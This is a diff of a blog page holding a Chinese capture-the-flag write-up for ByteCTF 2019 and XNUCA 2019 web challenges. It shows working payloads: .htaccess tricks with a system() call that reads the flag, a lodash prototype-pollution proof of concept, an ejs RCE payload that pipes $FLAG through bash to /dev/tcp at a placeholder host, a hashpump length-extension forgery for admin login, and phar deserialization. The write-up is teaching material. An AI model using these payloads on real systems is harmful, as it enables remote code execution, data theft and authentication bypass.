@@ -1,66 +1,125 @@
 <!DOCTYPE html>
-<html>
-<head><meta name="generator" content="Hexo 3.8.0">
-  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>ByteCTF_2019&amp;XNUCA_2019部分web题复现 | Lethe | 忘川</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="author" content="Lethe">
-  <meta name="keywords" content="Lethe's Blog">
-  <meta name="description" content="Lethe's Blog">
-  <script id="hexo-configurations">
-  var CONFIG = {
-    root: '/',
-    theme: 'lx',
-    version: '1.4.5',
-    localsearch:{
-      "enable": false,
-      "trigger": "auto",
-      "top_n_per_article": 1,
-      "unescape": false,
-      "preload": false
-      },
-    path: '-'
-  };
-</script>
+<html lang="">
 
-  <link rel="shortcut icon" href="/hacker.png">
-  <link rel="stylesheet" href="/css/main.css">
-  <script src="/js/jquery.min.js"></script>
-  <script src="/js/jquery.jside.menu.js"></script>
-	<script>
-	$(document).ready(function(){
-	$(".menu-container").jSideMenu({
-	    jSidePosition: "position-right",
-	    jSideSticky: true,
-	    jSideSkin: "moonlit",
-	     });
-	}); 
-	</script>
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="description" content="Lethe&#39;s Blog">
+  <meta name="author" content="Lethe">
+  <meta name="keywords" content="Lethe&#39;s Blog">
+  <title>ByteCTF_2019&amp;XNUCA_2019部分web题复现 ~ Lethe | 忘川</title>
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
+  <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
+  <link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
   
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:300|Noto+Serif+SC&amp;display=swap">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+  
+  <link rel="stylesheet" href="/css/main.css">
+
+  
 </head>
+
+
 <body>
-<div class="single">
-<div id="page">
-<div id="lx-aside" style="background-image: url(/images/page-cover.jpg)" data-stellar-background-ratio="0.5">
-  <div class="overlay">
-  <div class="page-title">
-    <div class="avatar"><a href="/"><img src="/images/2.jpg"></a></div>
-    <span>2019-09-11</span>
-    <h2>ByteCTF_2019&XNUCA_2019部分web题复现</h2>
-    <div class="tags"><i class="fa fa-tag"></i><a class="tag-link" href="/tags/Writeup/">Writeup</a></div>
-    <div class="social-links">
-<a href="https://github.com/LetheSec" target="_blank"><i class="fa fa-github fa-fw"></i></a><a href="mailto:1013579926@qq.com"><i class="fa fa-envelope fa-fw"></i></a>
-</div></div>
-</div>
-</div>
-<div id="lx-main-content">
-  <div class="lx-post">
-    <div class="lx-entry padding">
-      <div>
-        <h1><span id="xnuca-2019-easyphp">XNUCA 2019 EasyPHP</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">"fl3g.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nJust one chance"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Lethe | 忘川</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/2.jpg')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              <p class="mt-3">Wednesday, September 11th 2019, 1:06 pm</p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto">
+          <div class="markdown-body">
+            <h1><span id="xnuca-2019-easyphp">XNUCA 2019 EasyPHP</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">"fl3g.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nJust one chance"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h4><span id="预期解">预期解</span></h4><p>1、题目给出了源码如上，大概意思就是：</p>
 <ul>
 <li><p>前后都有遍历删除目录下<code>index.php</code>以外的文件的代码</p>
@@ -75,11 +134,11 @@
 <p>2、发现可以写入php文件但是没有办法解析，于是尝试上传<code>.htaccess</code>文件来设置解析php文件，但是会报500，因为文件结尾被添加了一行无法解析<code>Just one chance</code>内容，我们知道在<code>.htaccess</code>中只有<code>#</code>单行注释符，并没有多行注释符，但是它像大多数语言一样支持用<code>\</code>拼接上下两行，所以可以利用<code># \</code>将最后一行的内容注释掉。</p>
 <p>解决了最后最后一行的问题，但是由于对于<code>content</code>内容的限制，同样没有办法直接设置解析php文件。</p>
 <p>3、观察到文件中有<code>include_once(&quot;fl3g.php&quot;);</code>一句，但是实际上<code>fl3g.php</code>文件已经被删除了，所以肯定有蹊跷… 翻阅php.ini的参数可以看到这个：</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914203024986.png" alt="在这里插入图片描述"><br>这个参数可以指定一个目录列表，其中require、include、fopen()、file()、readfile()和file_get_contents()函数在查找要包含的文件时，会分别考虑include路径中的每个条目。它将检查第一个路径，如果没有找到，则检查下一个路径，直到找到包含的文件或返回警告或错误。</p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914203024986.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这个参数可以指定一个目录列表，其中require、include、fopen()、file()、readfile()和file_get_contents()函数在查找要包含的文件时，会分别考虑include路径中的每个条目。它将检查第一个路径，如果没有找到，则检查下一个路径，直到找到包含的文件或返回警告或错误。</p>
 <p>所以想办法在其他目录下写入同名<code>fl3g.php</code>文件，并且里面包含我们的shell，然后通过设置此参数，然该文件可以成功包含<code>fl3g.php</code>从而getshell。</p>
 <p>4、下面就是如何在其他目录下写入文件，且文件名和内容可控，<code>filename</code>参数过滤了<code>/</code>，所以没办法直接通过<code>file_put_contents</code>函数。</p>
 <p>php的配置选项中有<code>error_log</code>可以满足这一点，<code>error_log</code>可以将php运行报错的记录写到指定文件中。</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914204129467.png" alt="在这里插入图片描述"><br>正好在文件中会包含一个不存在<code>fl3g.php</code>从而产生报错，所以我们可以把上面说的<code>include_path</code>设置为payload，这样就可以在我们指定的目录下生成文件了。</p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914204129467.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>正好在文件中会包含一个不存在<code>fl3g.php</code>从而产生报错，所以我们可以把上面说的<code>include_path</code>设置为payload，这样就可以在我们指定的目录下生成文件了。</p>
 <p>5、还有一点需要注意，这里写进error_log的内容会被html编码，这里可以使用utf7编码进行绕过。</p>
 <p>在线编码网站：<a href="http://toolswebtop.com/text/process/encode/utf-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/encode/utf-7</a></p>
 <p>6、步骤</p>
@@ -91,7 +150,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br></pre></td></tr></table></figure>
 <p>参考<a href="http://iv4n.xyz/2019-wp/#2019xnuca" target="_blank" rel="noopener">Iv4n</a>的payload：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://64252b1b-326b-43dd-8dcf-e8afa7dff495.node1.buuoj.cn/'</span></span><br><span class="line">r = requests.get(url+<span class="string">'?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20".htaccess"%0AErrorDocument%20404%20"&lt;?php%20system(\'cat%20../../../fl[a]g\');?&gt;\\'</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914221142759.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914221142759.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <h4><span id="非预期解二">非预期解二</span></h4><p>因为正则判断写的是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code>，而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0)</code>，因此存在了被绕过的可能。 通过设置<code>.htaccess</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>
 <p>导致preg_match返回False，继而绕过了正则判断，filename即可通过伪协议绕过前面stristr的判断实现Getshell。</p>
@@ -114,7 +173,7 @@
 <p>可参考：<a href="https://www.venustech.com.cn/article/1/9577.html" target="_blank" rel="noopener">https://www.venustech.com.cn/article/1/9577.html</a></p>
 <p>原POC是如下：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    mergeFn(&#123;&#125;, <span class="built_in">JSON</span>.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure>
-<p>我们在题目的环境下简单测试一下：<br><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/2019091515505735.png" alt="在这里插入图片描述"></p>
+<p>我们在题目的环境下简单测试一下：<br><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/2019091515505735.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>发现原型链污染可以成功，下面就是寻找可利用的点来进行RCE。</p>
 <p>此题使用使用ejs库作为模版引擎了，看一下<code>ejs.js</code>，发现从572行开始进行了大量的js代码拼接，关键部分如下：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.source) &#123;</span><br><span class="line">  <span class="keyword">this</span>.generateSource();</span><br><span class="line">  prepended += <span class="string">'  var __output = [], __append = __output.push.bind(__output);'</span> + <span class="string">'\n'</span>;</span><br><span class="line">  <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">    prepended += <span class="string">'  var '</span> + opts.outputFunctionName + <span class="string">' = __append;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (opts._with !== <span class="literal">false</span>) &#123;</span><br><span class="line">    prepended +=  <span class="string">'  with ('</span> + opts.localsName + <span class="string">' || &#123;&#125;) &#123;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    appended += <span class="string">'  &#125;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  appended += <span class="string">'  return __output.join("");'</span> + <span class="string">'\n'</span>;</span><br><span class="line">  <span class="keyword">this</span>.source = prepended + <span class="keyword">this</span>.source + appended;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (opts.compileDebug) &#123;</span><br><span class="line">  src = <span class="string">'var __line = 1'</span> + <span class="string">'\n'</span></span><br><span class="line">    + <span class="string">'  , __lines = '</span> + <span class="built_in">JSON</span>.stringify(<span class="keyword">this</span>.templateText) + <span class="string">'\n'</span></span><br><span class="line">    + <span class="string">'  , __filename = '</span> + (opts.filename ?</span><br><span class="line">    <span class="built_in">JSON</span>.stringify(opts.filename) : <span class="string">'undefined'</span>) + <span class="string">';'</span> + <span class="string">'\n'</span></span><br><span class="line">    + <span class="string">'try &#123;'</span> + <span class="string">'\n'</span></span><br><span class="line">    + <span class="keyword">this</span>.source</span><br><span class="line">    + <span class="string">'&#125; catch (e) &#123;'</span> + <span class="string">'\n'</span></span><br><span class="line">    + <span class="string">'  rethrow(e, __lines, __filename, __line, escapeFn);'</span> + <span class="string">'\n'</span></span><br><span class="line">    + <span class="string">'&#125;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  src = <span class="keyword">this</span>.source;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -124,7 +183,7 @@
 <p>最后生成了一个动态的函数，然后以<code>returned fn</code>返回并被执行。</p>
 <p>所以我们的思路就是覆盖<code>opts.outputFunctionName</code>，这样我们构造的payload就会被拼接进js语句中，并在ejs渲染时进行RCE。</p>
 <p>关于payload的构造，可参考这篇文章：<a href="http://f1sh.site/2019/04/17/node-js-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-cve-2017-16082-%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">node-js-学习笔记</a></p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190915162710452.png" alt="在这里插入图片描述"><br>最终payload如下：</p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190915162710452.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>最终payload如下：</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"wiki"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"a=1;process.mainModule.require('child_process').exec('bash -c \"echo $FLAG&gt;/dev/tcp/xxxxx/xxx\"')//"</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>将Content-Type改为json，发包6次触发合并操作，污染原型链，再次访问即可。</p>
 <p><br></p>
@@ -141,11 +200,11 @@
 <p>密钥长度为8，先随意登陆得到已知hash为52107b08c0f3342d2153ae1d68e6262c，利用hashpump：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 52107b08c0f3342d2153ae1d68e6262c</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 13</span><br><span class="line">Input Data to Add: Lethe</span><br><span class="line">ec1b7c99078d6f2be7c25481b53bad40</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00Lethe</span><br></pre></td></tr></table></figure>
 <p>所以添加Cookie：<code>user=ec1b7c99078d6f2be7c25481b53bad40</code></p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909135910582.png" alt="在这里插入图片描述"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin</span><br><span class="line">密码（将\x替换为%）：admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00Lethe</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909135910582.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin</span><br><span class="line">密码（将\x替换为%）：admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00Lethe</span><br></pre></td></tr></table></figure></p>
 <p>成功登陆，并可以上传文件。</p>
 <p>3、审计代码，看到那些类以及魔术方法，总是感觉像反序列化的题目，但是并没有地方使用了<code>unserialize()</code>。看到了config.php中的FIle类使用了<code>mime_content_type()</code>，想到了之前看的SUCTF2019出题笔记（<a href="https://xz.aliyun.com/t/6057），如下：" target="_blank" rel="noopener">https://xz.aliyun.com/t/6057），如下：</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="keyword">$this</span>-&gt;filepath))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"nonono~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $mine = mime_content_type(<span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">    $store_path = <span class="keyword">$this</span>-&gt;open(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">    $res[<span class="string">'mine'</span>] = $mine;</span><br><span class="line">    $res[<span class="string">'store_path'</span>] = $store_path;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909140947693.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909140947693.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>再配合上文件上传功能，所以这题整体的思路应该是利用 <strong>phar 反序列化</strong>：</p>
 <ul>
 <li><p>想办法将文件上传到其他目录中（这里因为tmp_name未知，所以无法利用）</p>
@@ -163,12 +222,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename, $filepath)</span></span>&#123;</span><br><span class="line">    $res = <span class="string">"$filename is in $filepath"</span>;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>思路到这里貌似卡住了，这个open函数没什么可利用的…</p>
 <p>但是这里<code>$admin</code>我们是可控的，于是可以找一下php里面有没有可以用来删除/重写文件的类，正好存在可利用的同名<code>open()方法</code>，这样我们就可以将<code>$admin</code>实例化为此类的对象。</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909145138811.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909145138811.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>搜索结果的第一个<code>ZipArchive</code>类就可以利用（<a href="https://www.php.net/manual/en/ziparchive.open.php）" target="_blank" rel="noopener">https://www.php.net/manual/en/ziparchive.open.php）</a></p>
 <p>该类的open方法，使用如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive :: open （ string $filename [， int $flags ]）： mixed</span><br></pre></td></tr></table></figure>
